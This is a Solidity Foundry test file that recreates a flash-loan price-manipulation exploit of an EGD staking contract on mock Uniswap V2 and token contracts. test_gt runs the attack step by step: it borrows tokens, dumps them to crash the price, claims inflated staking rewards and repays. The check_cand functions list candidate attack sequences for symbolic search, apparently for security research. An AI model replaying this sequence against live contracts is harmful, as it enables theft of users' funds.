// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./EGD.sol";
import "./EGDStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract EGDTest is Test, BlockLoader {
    EGD egd;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    EGDStaking egdstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address egdAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address egdstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1659914092;
    uint112 reserve0pair = 52443151506653906536540000;
    uint112 reserve1pair = 424456224403899287665961;
    uint32 blockTimestampLastpair = 1659914092;
    uint256 kLastpair = 22259713976354534524259402206876732922981387200000;
    uint256 price0CumulativeLastpair =
        17926177941217205516333779465403739154183922;
    uint256 price1CumulativeLastpair =
        4165161045287207174726887479302333129143660;
    uint256 totalSupplyegd = 118000000000000000000000000;
    uint256 balanceOfegdpair = 52443151506653906536540000;
    uint256 balanceOfegdattacker = 0;
    uint256 balanceOfegdegdstaking = 5670246682724687331970000;
    uint256 totalSupplyusdt = 4979997922172658408539526080;
    uint256 balanceOfusdtpair = 424456224403899287665961;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtegdstaking = 3;

    function setUp() public {
        owner = address(this);
        egd = new EGD();
        egdAddr = address(egd);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(egd),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        egdstaking = new EGDStaking(
            address(egd),
            address(usdt),
            address(router),
            address(pair)
        );
        egdstakingAddr = address(egdstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        egd.transfer(address(pair), balanceOfegdpair);
        usdt.transfer(address(egdstaking), balanceOfusdtegdstaking);
        egd.transfer(address(egdstaking), balanceOfegdegdstaking);
        usdt.approve(attacker, UINT256_MAX);
        egd.approve(attacker, UINT256_MAX);
        usdt.transfer(attacker, 100 ether);
        attackContract.setUp(address(usdt), address(egdstaking));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Egd Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(egd), usdt.decimals());
        queryERC20BalanceDecimals(address(egd), address(egd), egd.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(usdt), egd.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(pair), egd.decimals());
        emit log_string("");
        emit log_string("Egdstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(egdstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(egdstaking),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(attackContract),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_egd(uint256 amount) internal {
        egd.transferFrom(owner, attacker, amount);
    }

    function payback_egd(uint256 amount) internal {
        egd.transfer(owner, amount);
    }

    function swap_pair_egd_usdt(uint256 amount) internal {
        egd.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(egd);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_usdt_egd(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(egd);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function transaction_egdstaking_egd(uint256 amount) internal {
        egdstaking.claimAllReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 60 * 60 * 24 * 10);
        borrow_egd(500000000e18);
        printBalance("After step0 ");

        emit log_named_decimal_uint(
            "[INFO] EGD/USDT Price after price manipulation",
            egdstaking.getEGDPrice(),
            18
        );
        swap_pair_egd_usdt(egd.balanceOf(attacker));

        emit log_named_decimal_uint(
            "[INFO] EGD/USDT Price after price manipulation",
            egdstaking.getEGDPrice(),
            18
        );

        printBalance("After step1 ");
        transaction_egdstaking_egd(0);
        printBalance("After step2 ");
        swap_pair_usdt_egd(420000e18);
        printBalance("After step3 ");
        payback_egd((500000000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 60);
        borrow_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        payback_egd(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
